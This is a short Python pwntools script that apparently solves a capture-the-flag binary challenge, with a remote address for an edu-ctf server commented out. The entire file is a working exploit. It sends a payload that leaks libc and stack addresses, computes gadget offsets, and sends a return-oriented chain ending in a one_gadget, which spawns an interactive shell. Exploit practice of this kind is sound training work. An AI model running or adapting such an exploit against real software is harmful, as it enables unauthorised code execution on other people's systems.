from pwn import *

#r = remote('edu-ctf.zoolab.org',10014)
r = process('./share/chal')
payload = p64(0) * 3 + int.to_bytes(161,1,'little')
input()
r.send(payload)

r.recv(0x18)
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x240a1
r.recv(0xa)
stack = u64(r.recv(6) + b'\x00\x00') - 0x108    
print(hex(libc_base))
print(hex(stack))

pop_r12_ret = libc_base + 0x2f709
one_gadget = libc_base + 0xe3afe

input()
r.send(p64(0) * 3 + p64(pop_r12_ret) + p64(0) + p64(one_gadget))




r.interactive()
